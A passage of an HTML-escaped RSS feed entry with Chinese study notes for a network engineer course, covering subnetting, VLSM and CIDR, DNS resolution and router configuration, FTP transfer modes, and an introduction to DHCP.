&lt;li&gt;将B类网络169.195.0.0划分成若干子网，要求每个子网内可配置主机700台&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;img src=&#34;https://development-bj-01.oss-cn-beijing.aliyuncs.com/PicGo/20200427160746.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;h4 id=&#34;根据子网掩码计算子网数&#34;&gt;根据子网掩码计算子网数&lt;/h4&gt;
&lt;ul&gt;
&lt;li&gt;假设子网号位数为M，则子网数为2^M^个&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;img src=&#34;https://development-bj-01.oss-cn-beijing.aliyuncs.com/PicGo/20200427161204.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;h4 id=&#34;根据子网数划分子网&#34;&gt;根据子网数划分子网&lt;/h4&gt;
&lt;ul&gt;
&lt;li&gt;假设需要划分X个子网，每个子网包括尽可能多的主机，并且满足2^M^≥X≥2^M^-1&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;img src=&#34;https://development-bj-01.oss-cn-beijing.aliyuncs.com/PicGo/20200427162714.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;h4 id=&#34;示例根据子网数划分子网&#34;&gt;示例：根据子网数划分子网&lt;/h4&gt;
&lt;ul&gt;
&lt;li&gt;将B类网络168.195.0.0划分成27个子网，每个子网包括尽可能多的主机&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;img src=&#34;https://development-bj-01.oss-cn-beijing.aliyuncs.com/PicGo/20200427162832.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;h3 id=&#34;vlsm和cidr&#34;&gt;VLSM和CIDR&lt;/h3&gt;
&lt;h4 id=&#34;vlsm&#34;&gt;VLSM&lt;/h4&gt;
&lt;ul&gt;
&lt;li&gt;子网划分的局限性
&lt;ul&gt;
&lt;li&gt;无法实现把网络划分成不同大小的子网&lt;/li&gt;
&lt;li&gt;常常会浪费许多主机地址&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;VLSM（Variable Length Subnet Mask，可变长子网掩码）
&lt;ul&gt;
&lt;li&gt;允许使用多个子网掩码划分子网&lt;/li&gt;
&lt;li&gt;使组织的IP地址空间得到更有效的利用&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h4 id=&#34;cidr&#34;&gt;CIDR&lt;/h4&gt;
&lt;ul&gt;
&lt;li&gt;Internet面临的问题
&lt;ul&gt;
&lt;li&gt;随着Internet的成长，路由表迅速扩大&lt;/li&gt;
&lt;li&gt;IPv4地址将很快耗尽&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;CIDR（Classless Inter-Domain Routing，无类域间路由）
&lt;ul&gt;
&lt;li&gt;消除了自然分类地址和子网划分的界限&lt;/li&gt;
&lt;li&gt;将网络前缀相同的连续IP地址组成CIDR地址块&lt;/li&gt;
&lt;li&gt;支持强化地址汇聚&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h4 id=&#34;无类域间路由斜线表示法&#34;&gt;无类域间路由斜线表示法&lt;/h4&gt;
&lt;ul&gt;
&lt;li&gt;CIDR使用斜线表示法表示一个网络&lt;/li&gt;
&lt;li&gt;斜线表示法采用IP地址后跟一个斜线&lt;code&gt;/&lt;/code&gt;，斜线后是一个表示网络前缀长度的数值&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;img src=&#34;https://development-bj-01.oss-cn-beijing.aliyuncs.com/PicGo/20200427165350.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;​	&lt;code&gt;192.168.1.1/27&lt;/code&gt;&lt;/p&gt;
&lt;h3 id=&#34;本节总结-6&#34;&gt;本节总结&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;子网划分缓解了IP地址资源耗尽&lt;/li&gt;
&lt;li&gt;进行子网规划时涉及多种计算&lt;/li&gt;
&lt;li&gt;定长子网划分要求网络使用同一子网掩码&lt;/li&gt;
&lt;li&gt;VLSM和CIDR可以更加有效地利用IP地址空间&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;本节习题-5&#34;&gt;本节习题&lt;/h3&gt;
&lt;ol&gt;
&lt;li&gt;&lt;strong&gt;子网划分需求背景&lt;/strong&gt;
&lt;ul&gt;
&lt;li&gt;早期二级IP网络造成IP地址使用浪费严重&lt;/li&gt;
&lt;li&gt;IP网络数量不敷使用&lt;/li&gt;
&lt;li&gt;业务扩展缺乏灵活性（IANA）&lt;/li&gt;
&lt;li&gt;无法应对Internet的爆炸式增长&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;子网划分&lt;/strong&gt;
&lt;ul&gt;
&lt;li&gt;A类地址默认掩码为：255.0.0.0&lt;/li&gt;
&lt;li&gt;B类地址默认掩码为：255.255.0.0&lt;/li&gt;
&lt;li&gt;C类地址默认掩码为：255.255.255.0&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;计算子网内可用主机地址数&lt;/strong&gt;
&lt;ul&gt;
&lt;li&gt;假设子网的主机号位数为N，则可用地址数位2^N^-2个&lt;/li&gt;
&lt;li&gt;主机号全1称之为子网的广播地址，主机号全0称之为子网的网络地址&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;根据主机地址数划分子网&lt;/strong&gt;（+2-2是刨去广播地址和网络地址）
&lt;ul&gt;
&lt;li&gt;假设每个子网需要划分 Y个IP地址，并且满足2^N^≥Y+2≥2^N^-1，则主机号位数为N，子网掩码位数为32-N&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;根据子网掩码计算子网数&lt;/strong&gt;
&lt;ul&gt;
&lt;li&gt;假设子网号位数为M个，则子网数为2^M^个&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;子网划分、VLSM、CIDR&lt;/strong&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;子网划分的局限性&lt;/strong&gt;
&lt;ul&gt;
&lt;li&gt;无法实现把网络划分为不同大小的子网&lt;/li&gt;
&lt;li&gt;常常会浪费许多主机地址&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;VLSM（Variable Length Subnet Mask，可变长子网掩码）&lt;/strong&gt;
&lt;ul&gt;
&lt;li&gt;允许使用多个子网掩码划分子网&lt;/li&gt;
&lt;li&gt;使组织的IP地址空间得到更有效的利用&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;CIDR（Classless Inter-Domain Routing，无类域间路由）&lt;/strong&gt;
&lt;ul&gt;
&lt;li&gt;消除了自然分类地址和子网划分的界限&lt;/li&gt;
&lt;li&gt;将网络前缀相同的连续IP地址组成CIDR地址块&lt;/li&gt;
&lt;li&gt;支持强化地址汇聚&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;h2 id=&#34;2-dns域名系统&#34;&gt;2. DNS域名系统&lt;/h2&gt;
&lt;h3 id=&#34;引入-7&#34;&gt;引入&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;IP地址是点分十进制数字，很难记忆&lt;/li&gt;
&lt;li&gt;DNS（Domain Name System，域名系统）能够提供主机名和IP地址之间的映射&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;本节目标-1&#34;&gt;本节目标&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;掌握DNS的作用&lt;/li&gt;
&lt;li&gt;掌握DNS域名结构&lt;/li&gt;
&lt;li&gt;掌握DNS域名的解析过程&lt;/li&gt;
&lt;li&gt;掌握DNS两种查询方式&lt;/li&gt;
&lt;li&gt;了解DNS反向查询相关知识&lt;/li&gt;
&lt;li&gt;掌握如何在路由器上配置DNS&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;主机名与ip地址映射需求&#34;&gt;主机名与IP地址映射需求&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;IP地址难以记忆&lt;/li&gt;
&lt;li&gt;能否用便于记忆的名字来映射IP地址？&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;img src=&#34;https://development-bj-01.oss-cn-beijing.aliyuncs.com/PicGo/20200428005435.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;h3 id=&#34;早期没有dns的时候--hosts文件&#34;&gt;早期没有DNS的时候 —— Hosts文件&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;Hosts文件记录了主机名和IP地址的对应信息&lt;/li&gt;
&lt;li&gt;Hosts文件是主机本地文件&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;img src=&#34;https://development-bj-01.oss-cn-beijing.aliyuncs.com/PicGo/20200428005624.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;h3 id=&#34;dns简介&#34;&gt;DNS简介&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;DNS系统的作用
&lt;ul&gt;
&lt;li&gt;提供了主机名字和IP地址间的相互转换&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;DNS系统的模式
&lt;ul&gt;
&lt;li&gt;采用客户端/服务器模式&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;DNS系统的结构
&lt;ul&gt;
&lt;li&gt;是一个具有树状层次结构的，联机分布式数据库系统&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;域名&#34;&gt;域名&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;域是因特网中一种管理范围的划分
&lt;ul&gt;
&lt;li&gt;顶级域、二级域、三级域等等&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;DNS域名结构是包括多级域名的分层结构
&lt;ul&gt;
&lt;li&gt;顶级域名、二级域名三级域名等等&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;不同等级的域名之间使用点号分隔，级别最低的域名写在最左边，而级别最高的域名则写在最右边&lt;/li&gt;
&lt;li&gt;每一级的域名都由字母和数字组成，不区分大小写&lt;/li&gt;
&lt;li&gt;域名的根域用&lt;code&gt;.&lt;/code&gt;表示，以点号结尾的域名称为完全合格域名FQDN（Full Qualified Domain Name）&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;因特网域名结构树&#34;&gt;因特网域名结构树&lt;/h3&gt;
&lt;p&gt;&lt;img src=&#34;https://development-bj-01.oss-cn-beijing.aliyuncs.com/PicGo/20200428010708.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;h3 id=&#34;dns域名解析原理&#34;&gt;DNS域名解析原理&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;DNS系统采用客户机/服务器架构，使用的传输层协议为TCP或UDP，服务器端口号53&lt;/li&gt;
&lt;li&gt;域名解析工作是通过调用服务器上的解析器软件完成的&lt;/li&gt;
&lt;li&gt;DNS域名解析按照域名空间的分层树状结构自顶至下进行&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;img src=&#34;https://development-bj-01.oss-cn-beijing.aliyuncs.com/PicGo/20200428010959.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;h3 id=&#34;dns域名解析完整过程&#34;&gt;DNS域名解析完整过程&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;本地域名服务器
&lt;ul&gt;
&lt;li&gt;离客户端较近，机构自行管理的域名服务器&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;根域名服务器
&lt;ul&gt;
&lt;li&gt;直接管理顶级域的域名服务器&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;img src=&#34;https://development-bj-01.oss-cn-beijing.aliyuncs.com/PicGo/20200428011224.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;h3 id=&#34;递归查询&#34;&gt;递归查询&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;如果DNS服务器支持递归查询，那么当它接收到递归查询请求后，它将负责把最终的查询结果返回请求发送方。即使执行递归查询的DNS服务器无法从本地数据库返回查询结果，它也必须查询其他的DNS服务器，直到得到确认的查询结果。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;一般客户机与本地DNS域名服务器之间的查询交互采用的就是递归查询方式。&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;img src=&#34;https://development-bj-01.oss-cn-beijing.aliyuncs.com/PicGo/20200428011755.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;h3 id=&#34;迭代查询&#34;&gt;迭代查询&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;DNS服务器接收到迭代查询请求后，如果无法从本地数据库返回查询结果，它会返回一个可能知道查询结果的DNS服务器地址给请求者，由请求者自行查询该DNS服务器，以此类推，请求者最终将得到查询结果&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;一般本地域名服务器发送至根域名服务器的查询采用的就是迭代查询&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;img src=&#34;https://development-bj-01.oss-cn-beijing.aliyuncs.com/PicGo/20200428011959.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;h3 id=&#34;反向查询&#34;&gt;反向查询&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;DNS反向查询允许DNS客户端根据已知的IP地址查找主机所对应的域名&lt;/li&gt;
&lt;li&gt;因特网域名树种设立了一个特殊的in-addr.arpa反向查询域用于反向查询&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;img src=&#34;https://development-bj-01.oss-cn-beijing.aliyuncs.com/PicGo/20200428012413.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;h3 id=&#34;h3c设备dns功能实现&#34;&gt;H3C设备DNS功能实现&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;静态域名解析
&lt;ul&gt;
&lt;li&gt;手工建立域名和IP地址之间的对应关系&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;动态域名解析
&lt;ul&gt;
&lt;li&gt;由DNS域名服务器完成解析&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;DNS代理
&lt;ul&gt;
&lt;li&gt;设备对DNS解析进行中继&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;配置静态及动态域名解析&#34;&gt;配置静态及动态域名解析&lt;/h3&gt;
&lt;p&gt;&lt;img src=&#34;https://development-bj-01.oss-cn-beijing.aliyuncs.com/PicGo/20200428012614.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;h3 id=&#34;配置dns代理&#34;&gt;配置DNS代理&lt;/h3&gt;
&lt;p&gt;&lt;img src=&#34;https://development-bj-01.oss-cn-beijing.aliyuncs.com/PicGo/20200428012659.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;h3 id=&#34;域名解析显示及维护&#34;&gt;域名解析显示及维护&lt;/h3&gt;
&lt;p&gt;&lt;img src=&#34;https://development-bj-01.oss-cn-beijing.aliyuncs.com/PicGo/20200428012733.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;h3 id=&#34;本节总结-7&#34;&gt;本节总结&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;DNS域名及域名树的基础知识&lt;/li&gt;
&lt;li&gt;域名解析过程&lt;/li&gt;
&lt;li&gt;域名解析两种查询方式&lt;/li&gt;
&lt;li&gt;设备DNS特性及相关配置&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;3-文件传输协议&#34;&gt;3. 文件传输协议&lt;/h2&gt;
&lt;h3 id=&#34;引入-8&#34;&gt;引入&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;如何在互联网中的主机和服务器之间传输文件呢？&lt;/li&gt;
&lt;li&gt;文件传输协议能够提供在远端主机和本地服务器之间传输文件的服务&lt;/li&gt;
&lt;li&gt;FTP和TFTP是最常用的文件传输协议&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;本节目标-2&#34;&gt;本节目标&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;掌握FTP协议基础知识&lt;/li&gt;
&lt;li&gt;熟悉FTP协议文件传输模式&lt;/li&gt;
&lt;li&gt;熟悉FTP数据传输方式&lt;/li&gt;
&lt;li&gt;掌握TFTP协议基础知识&lt;/li&gt;
&lt;li&gt;掌握FTP与TFTP相关配置方法&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;ftp协议简介&#34;&gt;FTP协议简介&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;FTP协议是互联网上广泛使用的文件传输协议&lt;/li&gt;
&lt;li&gt;客户端/服务器模式，基于TCP&lt;/li&gt;
&lt;li&gt;FTP采用双TCP连接方式
&lt;ul&gt;
&lt;li&gt;控制连接使用TCP端口号21&lt;/li&gt;
&lt;li&gt;数据连接使用TCP端口号20&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;FTP有两种文件传输模式&lt;/li&gt;
&lt;li&gt;FTP采用两种数据传输方式
&lt;ul&gt;
&lt;li&gt;主动方式&lt;/li&gt;
&lt;li&gt;被动方式&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;ftp双tcp连接方式&#34;&gt;FTP双TCP连接方式&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;控制连接
&lt;ul&gt;
&lt;li&gt;用于在FTP客户端和FTP服务器之间传输FTP控制命令及命令执行信息。控制连接在整个FTP会话期间一直保持打开。&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;数据连接
&lt;ul&gt;
&lt;li&gt;用于传输数据，包括数据上传、下载、文件列表发送等。数据传输结束后数据连接将终止。&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;img src=&#34;https://development-bj-01.oss-cn-beijing.aliyuncs.com/PicGo/20200430212952.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;h3 id=&#34;ftp文件传输模式&#34;&gt;FTP文件传输模式&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;ASCII模式是默认的文件传输模式，主要特点是：
&lt;ul&gt;
&lt;li&gt;本地文件转换成标准的ASCII码再传输&lt;/li&gt;
&lt;li&gt;适用于传输文本文件（.cfg）&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;二进制流模式也称为图像文件传输模式，主要特点是：
&lt;ul&gt;
&lt;li&gt;文件按照比特流的方式进行传输&lt;/li&gt;
&lt;li&gt;适用于传送程序文件（.bin）&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;ftp主动数据传输方式&#34;&gt;FTP主动数据传输方式&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;主动方式也成为PORT方式，是FTP协议最初定义的数据传输连接方式，主要特点是：
&lt;ul&gt;
&lt;li&gt;FTP客户端通过向FTP服务器发送PORT命令，告诉服务器该客户端用于传输数据的临时端口号&lt;/li&gt;
&lt;li&gt;当需要传送数据时，服务器通过TCP端口号20与客户端的临时端口建立数据传输通道，完成数据传输&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;在建立数据连接的过程中，由服务器主动发起链接，因此被称为主动方式&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;主动方式建立连接过程&#34;&gt;主动方式建立连接过程&lt;/h3&gt;
&lt;p&gt;&lt;img src=&#34;https://development-bj-01.oss-cn-beijing.aliyuncs.com/PicGo/20200430222943.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;h3 id=&#34;ftp被动数据传输方式&#34;&gt;FTP被动数据传输方式&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;被动方式也称为PASV方式，&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;4-dhcp&#34;&gt;4. DHCP&lt;/h2&gt;
&lt;h3 id=&#34;引入-9&#34;&gt;引入&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;手动为局域网中大量主机配置IP地址、掩码、网关等参数的工作繁琐，容易出错&lt;/li&gt;
&lt;li&gt;DHCP可以自动为局域网中主机完成TCP/IP协议配置&lt;/li&gt;
&lt;li&gt;DHCP自动配置避免了IP地址冲突的问题&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;课程目标-10&#34;&gt;课程目标&lt;/h3&gt;
&lt;p&gt;学习完本课程，你应该能够：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;掌握DHCP原理和特点&lt;/li&gt;
&lt;li&gt;掌握DHCP地址分配方式&lt;/li&gt;
&lt;li&gt;熟悉DHCP协议中IP地址获取过程&lt;/li&gt;
&lt;li&gt;了解DHCP中继的工作原理&lt;/li&gt;
&lt;li&gt;掌握路由器上DHCP相关配置方法&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;dhcp简介&#34;&gt;DHCP简介&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;DHCP 是 Dynamic Host Configuration Protocol（动态主机配置协议）的缩写&lt;/li&gt;
&lt;li&gt;DHCP 是从 BOOTP（Bootstrap Protocol）协议发展而来，其作用向主机动态分配IP地址及其他相关信息&lt;/li&gt;
&lt;li&gt;DHCP采用客户端/服务器模式，服务器负责集中管理，客户端向服务器提出配置申请，服务器根据策略返回相应配置信息&lt;/li&gt;
&lt;li&gt;DHCP报文采用UDP封装，服务器所侦听的端口号是67，客户端的端口号是68&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;dhcp特点&#34;&gt;DHCP特点&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;即插即用性
&lt;ul&gt;
&lt;li&gt;客户端无须配置能即能获得IP地址即相关参数。简化客户端网络配置，降低维护成本。&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;统一管理
&lt;ul&gt;
&lt;li&gt;所有IP地址即相关参数信息由DHCP服务器统一管理，统一分配&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;使用效率高
&lt;ul&gt;
&lt;li&gt;通过IP地址租期管理，提高IP地址的使用效率&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;可跨网段实现
&lt;ul&gt;
&lt;li&gt;通过使用DHCP中继，可使处于不同子网中的客户端和DHCP服务器之间实现协议报文交互&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;dhcp系统组成&#34;&gt;DHCP系统组成&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;DHCP服务器
&lt;ul&gt;
&lt;li&gt;能提供DHCP功能的服务器或具有DHCP功能的网络设备&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;DHCP中继
&lt;ul&gt;
&lt;li&gt;一般为路由器或三层交换机等网络设备&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;DHCP客户端
&lt;ul&gt;
&lt;li&gt;需要动态获得IP地址的主机&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;img src=&#34;https://development-bj-01.oss-cn-beijing.aliyuncs.com/PicGo/20200430233054.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;h2 id=&#34;5-ipv6&#34;&gt;5. IPv6&lt;/h2&gt;
- https://b40du.github.io/posts/note-aqniu-network-engineer/ - This is a customized copyright.</description>
        </item>
    
    
  </channel>
</rss> 